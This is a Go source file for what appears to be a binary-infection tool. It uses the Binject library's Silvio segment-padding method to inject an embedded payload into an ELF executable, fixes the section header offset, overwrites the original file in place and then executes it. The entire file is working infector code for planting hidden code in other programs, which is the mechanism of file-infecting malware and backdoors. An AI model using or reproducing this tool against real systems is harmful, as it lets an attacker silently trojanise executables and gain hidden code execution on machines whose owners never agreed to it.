package main

import (
	"bytes"
	_ "embed"
	"github.com/Binject/binjection/bj"
	"github.com/Binject/debug/elf"
	"io/ioutil"
	"log"
	"os"
	"syscall"
)

//go:embed payload/mmap
var payloadBytes []byte

func main() {
	if len(os.Args) < 2 {
		log.Printf("Usage: %s <binary> <args>\n", os.Args[0])
		return
	}

	inputStat, err := os.Stat(os.Args[1])
	if err != nil {
		log.Printf("Error while opening input binary: %s\n", err)
		return
	}

	input, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Printf("Error while opening input binary: %s\n", err)
		return
	}

	elfFile, err := elf.NewFile(bytes.NewReader(input))
	if err != nil {
		log.Printf("Error while opening input binary: %s\n", err)
		return
	}
	output, shoff, err := bj.StaticSilvioMethod(elfFile, payloadBytes)
	if err != nil {
		log.Printf("Error: %s\n", err)
		return
	}

	// Fix section table offset
	// Go binaries place the section table header at the begging of the file (after the segments table)
	// Bininject moves the section table to the end of the file and therefore the file header need to be patched
	// The shoff field in the header points to the old location (start of the file) we change it to point to the new location
	// (end of file) 40 - 48 is the relevant bytes in the header (fixed for 64bit, other values for 32bit)
	b := make([]byte, 8)
	elfFile.ByteOrder.PutUint64(b, shoff)
	j := 0
	for i := 40; i < 48; i++ {
		output[i] = b[j]
		j++
	}

	err = ioutil.WriteFile(os.Args[1], output, inputStat.Mode())
	if err != nil {
		log.Printf("Error writing file: %s\n", err)
		return
	}

	err = syscall.Exec(os.Args[1], os.Args[1:], os.Environ())
	if err != nil {
		log.Printf("Error exec: %s\n", err)
		return
	}
}
